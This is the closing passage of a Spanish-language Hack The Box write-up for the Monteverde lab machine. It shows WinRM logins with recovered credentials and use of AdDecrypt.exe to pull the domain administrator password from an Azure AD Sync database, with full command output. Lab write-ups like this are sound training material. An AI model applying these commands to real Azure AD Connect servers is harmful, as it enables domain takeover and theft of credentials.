+┌──<span class="o">(</span>root💀pro<span class="o">)</span>-[/home/…/Escritorio/HTB/Monteverde/nmap]
+└─# crackmapexec winrm 10.10.10.172 <span class="nt">-u</span> mhope <span class="nt">-p</span> <span class="s1">'4n0therD4y@n0th3r$'</span>                                                                                                                                           1 ⚙
+WINRM       10.10.10.172    5985   MONTEVERDE       <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 <span class="o">(</span>name:MONTEVERDE<span class="o">)</span> <span class="o">(</span>domain:MEGABANK.LOCAL<span class="o">)</span>
+WINRM       10.10.10.172    5985   MONTEVERDE       <span class="o">[</span><span class="k">*</span><span class="o">]</span> http://10.10.10.172:5985/wsman
+WINRM       10.10.10.172    5985   MONTEVERDE       <span class="o">[</span>+] MEGABANK.LOCAL<span class="se">\m</span>hope:4n0therD4y@n0th3r<span class="nv">$ </span><span class="o">(</span>Pwn3d!<span class="o">)</span>
+
+<span class="c"># evil-winrm -i 10.10.10.172 -u mhope -p '4n0therD4y@n0th3r$'                                                                                                                                          130 ⨯ 1 ⚙</span>
+
+Evil-WinRM shell v3.3
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine
+Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+Info: Establishing connection to remote endpoint
+
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\m</span>hope<span class="se">\D</span>ocuments&gt; <span class="nb">cd</span> ..
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\m</span>hope&gt; <span class="nb">cd </span>Desk<span class="k">*</span>
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\m</span>hope<span class="se">\D</span>esktop&gt; <span class="nb">dir
+
+    </span>Directory: C:<span class="se">\U</span>sers<span class="se">\m</span>hope<span class="se">\D</span>esktop
+
+
+Mode                LastWriteTime         Length Name
+<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
+<span class="nt">-ar---</span>         1/3/2020   5:48 AM             32 <span class="s2">"user.txt"</span>
+
+</code></pre></div></div>
+
+<p>Procedemos a sacar la flag .txt</p>
+
+<h1 id="microsoft-azure-ad-sync-privilege-escalation">Microsoft Azure AD Sync Privilege Escalation</h1>
+
+<p>Procedemos a enumerar el sistema:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\m</span>hope<span class="se">\D</span>esktop&gt; <span class="nb">whoami</span> /all
+
+USER INFORMATION
+<span class="nt">----------------</span>
+
+User Name      SID
+<span class="o">==============</span> <span class="o">============================================</span>
+megabank<span class="se">\m</span>hope S-1-5-21-391775091-850290835-3566037492-1601
+
+
+GROUP INFORMATION
+<span class="nt">-----------------</span>
+
+Group Name                                  Type             SID                                          Attributes
+<span class="o">===========================================</span> <span class="o">================</span> <span class="o">============================================</span> <span class="o">==================================================</span>
+Everyone                                    Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
+BUILTIN<span class="se">\R</span>emote Management Users             Alias            S-1-5-32-580                                 Mandatory group, Enabled by default, Enabled group
+BUILTIN<span class="se">\U</span>sers                               Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
+BUILTIN<span class="se">\P</span>re-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY<span class="se">\N</span>ETWORK                        Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY<span class="se">\A</span>uthenticated Users            Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY<span class="se">\T</span>his Organization              Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
+<span class="s2">"MEGABANK</span><span class="se">\A</span><span class="s2">zure Admins     "</span>                  Group            S-1-5-21-391775091-850290835-3566037492-2601 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY<span class="se">\N</span>TLM Authentication            Well-known group S-1-5-64-10                                  Mandatory group, Enabled by default, Enabled group
+Mandatory Label<span class="se">\M</span>edium Plus Mandatory Level Label            S-1-16-8448
+
+
+PRIVILEGES INFORMATION
+<span class="nt">----------------------</span>
+
+Privilege Name                Description                    State
+<span class="o">=============================</span> <span class="o">==============================</span> <span class="o">=======</span>
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working <span class="nb">set </span>Enabled
+</code></pre></div></div>
+
+<p>Explotacion del Grupo de Azure Admins:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s2">"Microsoft Azure AD Sync Privilege Escalation"</span>
+
+https://vbscrub.com/2020/01/14/azure-ad-connect-database-exploit-priv-esc/    <span class="nt">--</span><span class="o">&gt;</span> Fuente de Info   <span class="nt">--</span><span class="o">&gt;</span> Comando a aplicar en la ruta en la que subimos los archivos
+
+https://github.com/VbScrub/AdSyncDecrypt/releases  <span class="nt">--</span><span class="o">&gt;</span> Github descargar el .zip y descomprimirlo
+
+</code></pre></div></div>
+
+<p>Nos descargamos los recursos y los descomprimimos</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># ls</span>
+AdDecrypt.exe  AdDecrypt.zip  mcrypt.dll
+</code></pre></div></div>
+
+<p>Procedemos subimos los archivos a la maquina en la ruta <code class="language-plaintext highlighter-rouge">"C:\Windows\Temp\Prueba\ ------------ "</code>
+Nos desplazamos a esta ruta <code class="language-plaintext highlighter-rouge">*Evil-WinRM* PS C:\Program Files\Microsoft Azure AD Sync\Bin&gt; </code></p>
+
+<p>Procedemos a usar el comando <code class="language-plaintext highlighter-rouge">"AdDecrypt.exe -FullSQL"</code> :</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\P</span>rogram Files<span class="se">\M</span>icrosoft Azure AD Sync<span class="se">\B</span><span class="k">in</span><span class="o">&gt;</span><span class="s2">" C:</span><span class="se">\W</span><span class="s2">indows</span><span class="se">\T</span><span class="s2">emp</span><span class="se">\P</span><span class="s2">rueba</span><span class="se">\A</span><span class="s2">dDecrypt.exe -FullSQL        "</span>
+
+<span class="o">======================</span>
+AZURE AD SYNC CREDENTIAL DECRYPTION TOOL
+Based on original code from: https://github.com/fox-it/adconnectdump
+<span class="o">======================</span>
+
+Opening database connection...
+Executing SQL commands...
+Closing database connection...
+Decrypting XML...
+Parsing XML...
+Finished!
+<span class="s2">"
+DECRYPTED CREDENTIALS:
+Username: administrator
+Password: d0m@in4dminyeah!
+Domain: MEGABANK.LOCAL "</span>
+
+</code></pre></div></div>
+<p>Conseguimos sacar la contraseña en texto claro del administrator
+Procedemos a sacar la flag conectandonos con Evil-Winrm</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># evil-winrm -i 10.10.10.172 -u administrator -p d0m@in4dminyeah! </span>
+
+Evil-WinRM shell v3.3
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine
+Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+Info: Establishing connection to remote endpoint
+
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; <span class="nb">cd</span> ..
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator&gt; <span class="nb">type </span>Desktop/root.txt
+12909612d25c8xxxxxxxxxxxx
+</code></pre></div></div>
+
+<p>Maquina Rooteada y concepto sobre el Grupo Azure Admins aprendido. K0H4ck =)</p>
+
+</div>
+
+
+<div class="comments">
+<div id="disqus_thread"></div>
+<script>
+ var disqus_config = function () {
+     this.page.url = 'http://localhost:4000/2022/03/05/Monteverde.html';
+     this.page.identifier = '/2022/03/05/Monteverde';
+     this.page.title = 'Maquina Retirada Monteverde AD de Hack The Box (Necesario VIP)';
+ };
+
+ (function() {  // REQUIRED CONFIGURATION VARIABLE: EDIT THE SHORTNAME BELOW
+     var d = document, s = d.createElement('script');
+
+     s.src = '//bitbrain-github-io.disqus.com/embed.js';
+
+     s.setAttribute('data-timestamp', +new Date());
+     (d.head || d.body).appendChild(s);
+ })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>
+
+</div>
+
+
+
+
+<div class="related">
+  <h2>related posts</h2>
+  <ul class="related-posts">
+    
+      <li>
+        <h3>
+          <a href="/2023/09/29/Buff-Bof.html">
+            Maquina  Retirada Buff de Hack The Box (Necesario VIP)
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/2022/06/05/Search-AD.html">
+            Maquina Retirada Search de Hack The Box (Necesario VIP)
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/2022/06/05/Attacktive-THM-AD.html">
+            Maquina Retirada Search de Hack The Box (Necesario VIP)
+          </a>
+        </h3>
+      </li>
+    
+  </ul>
+</div>
+
+
+
+
+  
+  <h2>all tags</h2>
+  <div class="tag-cloud"><a href="/tag/%26/" class="set-1">&</a> <a href="/tag/8.6%2C/" class="set-1">8.6,</a> <a href="/tag/ad/" class="set-1">AD</a> <a href="/tag/aspreproast/" class="set-1">ASPREPRoast</a> <a href="/tag/asrep-roast%2C/" class="set-1">ASREP-Roast,</a> <a href="/tag/asreproast/" class="set-1">ASREPRoast</a> <a href="/tag/active/" class="set-1">Active</a> <a href="/tag/admin%2C/" class="set-1">Admin,</a> <a href="/tag/admins/" class="set-1">Admins</a> <a href="/tag/admins%2C/" class="set-1">Admins,</a> <a href="/tag/archivos/" class="set-1">Archivos</a> <a href="/tag/attack%2C/" class="set-1">Attack,</a> <a href="/tag/attacks/" class="set-1">Attacks</a> <a href="/tag/azure/" class="set-1">Azure</a> <a href="/tag/bin/" class="set-1">Bin</a> <a href="/tag/bloodhound%2C/" class="set-1">BloodHound,</a> <a href="/tag/bruta%2C/" class="set-1">Bruta,</a> <a href="/tag/bruteforce%2C/" class="set-1">BruteForce,</a> <a href="/tag/burpsuite%2C/" class="set-1">Burpsuite,</a> <a href="/tag/bypass/" class="set-1">ByPass</a> <a href="/tag/bypass%2C/" class="set-1">Bypass,</a> <a href="/tag/ca/" class="set-1">CA</a> <a href="/tag/cgi-bin%2C/" class="set-1">CGI-BIN,</a> <a href="/tag/cron%2C/" class="set-1">CRON,</a> <a href="/tag/csrf/" class="set-1">CSRF</a> <a href="/tag/chkrootkit%2C/" class="set-1">Chkrootkit,</a> <a href="/tag/churrasco%2C/" class="set-1">Churrasco,</a> <a href="/tag/cifrado/" class="set-1">Cifrado</a> <a href="/tag/crackmapexec%2C/" class="set-1">Crackmapexec,</a> <a href="/tag/cron-taks%2C/" class="set-1">Cron-taks,</a> <a href="/tag/decimal%2C/" class="set-1">Decimal,</a> <a href="/tag/device/" class="set-1">Device</a> <a href="/tag/directory%2C/" class="set-1">Directory,</a> <a href="/tag/dominios%2C/" class="set-1">Dominios,</a> <a href="/tag/dovecot%2C/" class="set-1">Dovecot,</a> <a href="/tag/elastix%2C/" class="set-1">Elastix,</a> <a href="/tag/empezando%2C/" class="set-1">Empezando,</a> <a href="/tag/encrypt-decrypt%2C/" class="set-1">Encrypt-Decrypt,</a> <a href="/tag/enumeracion%2C/" class="set-1">Enumeracion,</a> <a href="/tag/enumeration%2C/" class="set-1">Enumeration,</a> <a href="/tag/evil-winrm%2C/" class="set-1">Evil-WinRm,</a> <a href="/tag/excel%2C/" class="set-1">Excel,</a> <a href="/tag/excell/" class="set-1">Excell</a> <a href="/tag/files%2C/" class="set-1">Files,</a> <a href="/tag/firefox%2C/" class="set-1">Firefox,</a> <a href="/tag/fueza/" class="set-1">Fueza</a> <a href="/tag/fuzzing%2C/" class="set-1">Fuzzing,</a> <a href="/tag/get-adobject%2C/" class="set-1">Get-ADObject,</a> <a href="/tag/getchanges-all%2C/" class="set-1">GetChanges-All,</a> <a href="/tag/gratuitas./" class="set-1">Gratuitas.</a> <a href="/tag/group%2C/" class="set-1">Group,</a> <a href="/tag/groups%2C/" class="set-1">Groups,</a> <a href="/tag/guessing%2C/" class="set-1">Guessing,</a> <a href="/tag/gwolle%2C/" class="set-1">Gwolle,</a> <a href="/tag/htb%2C/" class="set-5">HTB,</a> <a href="/tag/hacking/" class="set-4">Hacking</a> <a href="/tag/hacking%2C/" class="set-1">Hacking,</a> <a href="/tag/heartbleed%2C/" class="set-1">HeartBleed,</a> <a href="/tag/hex%2C/" class="set-1">Hex,</a> <a href="/tag/hydra%2C/" class="set-1">Hydra,</a> <a href="/tag/iis%2C/" class="set-1">IIS,</a> <a href="/tag/iis-6.0%2C/" class="set-1">IIS-6.0,</a> <a href="/tag/irc%2C/" class="set-1">IRC,</a> <a href="/tag/impackect-secretsdump%2C/" class="set-1">Impackect-SecretsDump,</a> <a href="/tag/import/" class="set-1">Import</a> <a href="/tag/juicypotato%2C/" class="set-1">JuicyPotato,</a> <a href="/tag/kerberoasting/" class="set-1">Kerberoasting</a> <a href="/tag/kerbrute/" class="set-1">Kerbrute</a> <a href="/tag/kerbrute%2C/" class="set-1">Kerbrute,</a> <a href="/tag/ldap%2C/" class="set-1">LDAP,</a> <a href="/tag/lfi%2C/" class="set-1">LFI,</a> <a href="/tag/mail%2C/" class="set-1">Mail,</a> <a href="/tag/maquina/" class="set-1">Maquina</a> <a href="/tag/maquinas/" class="set-5">Maquinas</a> <a href="/tag/mimikatz.exe%2C/" class="set-1">Mimikatz.exe,</a> <a href="/tag/mongodb%2C/" class="set-1">MongoDB,</a> <a href="/tag/mssqlclient%2C/" class="set-1">Mssqlclient,</a> <a href="/tag/multiples/" class="set-1">Multiples</a> <a href="/tag/myssql-server%2C/" class="set-1">Myssql-Server,</a> <a href="/tag/neo4j%2C/" class="set-1">Neo4j,</a> <a href="/tag/nibbleblog%2C/" class="set-1">NibbleBlog,</a> <a href="/tag/nishang%2C/" class="set-1">Nishang,</a> <a href="/tag/oscp/" class="set-4">OSCP</a> <a href="/tag/olevba/" class="set-1">Olevba</a> <a href="/tag/php%2C/" class="set-1">PHP,</a> <a href="/tag/php./" class="set-1">PHP.</a> <a href="/tag/password/" class="set-1">Password</a> <a href="/tag/path%2C/" class="set-4">Path,</a> <a href="/tag/plugins%2C/" class="set-1">Plugins,</a> <a href="/tag/popd%2C/" class="set-1">PopD,</a> <a href="/tag/portknocking%2C/" class="set-1">PortKnocking,</a> <a href="/tag/portal%2C/" class="set-1">Portal,</a> <a href="/tag/post-explotacion./" class="set-1">Post-Explotacion.</a> <a href="/tag/powershell/" class="set-1">PowerShell</a> <a href="/tag/powerup%2C/" class="set-1">PowerUp,</a> <a href="/tag/powershell%2C/" class="set-1">Powershell,</a> <a href="/tag/privesc/" class="set-1">Privesc</a> <a href="/tag/privesc%2C/" class="set-1">Privesc,</a> <a href="/tag/proteccions%2C/" class="set-1">Proteccions,</a> <a href="/tag/python%2C/" class="set-1">Python,</a> <a href="/tag/rce%2C/" class="set-1">RCE,</a> <a href="/tag/rdp-file%2C/" class="set-1">RDP-file,</a> <a href="/tag/rpcclient%2C/" class="set-1">RPCCLIENT,</a> <a href="/tag/readgmsapassword%2C/" class="set-1">ReadGMSAPassword,</a> <a href="/tag/recycle/" class="set-1">Recycle</a> <a href="/tag/remote/" class="set-1">Remote</a> <a href="/tag/retiradas/" class="set-1">Retiradas</a> <a href="/tag/retiradas%2C/" class="set-5">Retiradas,</a> <a href="/tag/retiradas./" class="set-1">Retiradas.</a> <a href="/tag/smb%2C/" class="set-1">SMB,</a> <a href="/tag/ss%2C/" class="set-1">SS,</a> <a href="/tag/ssh%2C/" class="set-1">SSH,</a> <a href="/tag/ssrf/" class="set-1">SSRF</a> <a href="/tag/ssrf%2C/" class="set-1">SSRF,</a> <a href="/tag/suid%2C/" class="set-1">SUID,</a> <a href="/tag/sam%2C/" class="set-1">Sam,</a> <a href="/tag/samba%2C/" class="set-1">Samba,</a> <a href="/tag/scheduler%2C/" class="set-1">Scheduler,</a> <a href="/tag/secretsdump.py%2C/" class="set-1">SecretsDump.py,</a> <a href="/tag/secretsdumps.py%2C/" class="set-1">Secretsdumps.py,</a> <a href="/tag/shares/" class="set-1">Shares</a> <a href="/tag/sharphound.ps1%2C/" class="set-1">SharpHound.ps1,</a> <a href="/tag/shellshock%2C/" class="set-1">ShellShock,</a> <a href="/tag/smbclient%2C/" class="set-1">SmbClient,</a> <a href="/tag/smbmap%2C/" class="set-1">SmbMap,</a> <a href="/tag/sqsh%2C/" class="set-1">Sqsh,</a> <a href="/tag/starting/" class="set-1">Starting</a> <a href="/tag/steganografia%2C/" class="set-1">Steganografia,</a> <a href="/tag/system%2C/" class="set-1">System,</a> <a href="/tag/thm%2C/" class="set-1">THM,</a> <a href="/tag/tmux-priv%2C/" class="set-1">Tmux-Priv,</a> <a href="/tag/tomcat/" class="set-1">Tomcat</a> <a href="/tag/transferencia/" class="set-1">Transferencia</a> <a href="/tag/unrealirc%2C/" class="set-1">UnRealIRC,</a> <a href="/tag/upload/" class="set-1">Upload</a> <a href="/tag/userenum%2C/" class="set-1">Userenum,</a> <a href="/tag/vnc/" class="set-1">VNC</a> <a href="/tag/web/" class="set-1">Web</a> <a href="/tag/webshell%2C/" class="set-1">Webshell,</a> <a href="/tag/wget/" class="set-1">Wget</a> <a href="/tag/winpeas%2C/" class="set-1">WinPeas,</a> <a href="/tag/windows/" class="set-1">Windows</a> <a href="/tag/windows%2C/" class="set-1">Windows,</a> <a href="/tag/wordpress%2C/" class="set-1">Wordpress,</a> <a href="/tag/wpscan%2C/" class="set-1">Wpscan,</a> <a href="/tag/writeup/" class="set-1">Writeup</a> <a href="/tag/writeup%2C/" class="set-4">Writeup,</a> <a href="/tag/xp_cmdshell%2C/" class="set-1">Xp_CmdShell,</a> <a href="/tag/xp_dirtree%2C/" class="set-1">Xp_dirtree,</a> <a href="/tag/zona%2C/" class="set-1">Zona,</a> <a href="/tag/app-js%2C/" class="set-1">app-js,</a> <a href="/tag/de/" class="set-1">de</a> <a href="/tag/fcrackzip%2C/" class="set-1">fcrackzip,</a> <a href="/tag/html/" class="set-1">html</a> <a href="/tag/injecction/" class="set-1">injecction</a> <a href="/tag/pfsense%2C/" class="set-1">pfSense,</a> <a href="/tag/pfx2john%2C/" class="set-1">pfx2john,</a> <a href="/tag/phpliteadmin%2C/" class="set-1">phpLiteAdmin,</a> <a href="/tag/privesc/" class="set-1">privesc</a> <a href="/tag/privesc%2C/" class="set-1">privesc,</a> <a href="/tag/python%2C/" class="set-1">python,</a> <a href="/tag/smtpd%2C/" class="set-1">smtpd,</a> <a href="/tag/steghide%2C/" class="set-1">steghide,</a> <a href="/tag/tar%2C/" class="set-1">tar,</a> <a href="/tag/xss/" class="set-1">xss</a></div>
+  
+
+
+
+
+<script>
+  let i = 0;
+  const text = 'En esta ocasion empezaremos con el Writeup de la maquina de HackTheBox llamada MonteVerde AD';
+  const speed = parseInt('50');
+  
+  function typeWriter() {
+    if (i < text.length) {
+      document.getElementById('animated-post-description').innerHTML += text.charAt(i);
+      i++;
+      setTimeout(typeWriter, speed);
+    }
+  }
+
+  document.getElementById('animated-post-description').style.display = 'initial';
+  typeWriter();
+</script>
+
+      </div>
+    </main><footer class="site-footer">
+  <div class="wrapper">
+    <div class="credits"><a href="https://github.com/bitbrain/jekyll-dash">dash</a> theme for Jekyll by <a href="https://github.com/bitbrain">bitbrain</a> made with <i class="fas fa-heart"></i><div class="toggleWrapper">
+    <input type="checkbox" class="dn" id="theme-toggle" onclick="modeSwitcher()" checked />
+    <label for="theme-toggle" class="toggle">
+    <span class="toggle__handler">
+      <span class="crater crater--1"></span>
+      <span class="crater crater--2"></span>
+      <span class="crater crater--3"></span>
+    </span>
+        <span class="star star--1"></span>
+        <span class="star star--2"></span>
+        <span class="star star--3"></span>
+        <span class="star star--4"></span>
+        <span class="star star--5"></span>
+        <span class="star star--6"></span>
+    </label>
+</div>
+<script type="text/javascript">
+const theme = localStorage.getItem('theme');
+
+if (theme === "light") {
+    document.documentElement.setAttribute('data-theme', 'light');
+} else {
+    document.documentElement.setAttribute('data-theme', 'dark');
+}
+const userPrefers = getComputedStyle(document.documentElement).getPropertyValue('content');
+
+function activateDarkTheme() {
+    document.getElementById('theme-toggle').checked = true;
+    document.documentElement.setAttribute('data-theme', 'dark');
+    document.documentElement.classList.add('theme--dark');
+    document.documentElement.classList.remove('theme--light');
+	document.getElementById("theme-toggle").className = 'light';
+	window.localStorage.setItem('theme', 'dark');
+}
+
+function activateLightTheme() {
+    document.getElementById('theme-toggle').checked = false;
+    document.documentElement.setAttribute('data-theme', 'light');
+    document.documentElement.classList.add('theme--light');
+    document.documentElement.classList.remove('theme--dark');
+	document.getElementById("theme-toggle").className = 'dark';
+	window.localStorage.setItem('theme', 'light');
+}
+
+if (theme === "dark") {
+    activateDarkTheme();
+} else if (theme === "light") {
+    activateLightTheme();
+} else if  (userPrefers === "light") {
+    activateDarkTheme();
+} else {
+    activateDarkTheme();
+}
+
+function modeSwitcher() {
+	let currentMode = document.documentElement.getAttribute('data-theme');
+	if (currentMode === "dark") {
+	    activateLightTheme();
+	} else {
+	    activateDarkTheme();
+	}
+}
+</script></div>
+  </div>
+</footer>
+
+
+<script>
+      window.FontAwesomeConfig = {
+        searchPseudoElements: true
+      }
+    </script>
+  </body>
+
+</html>
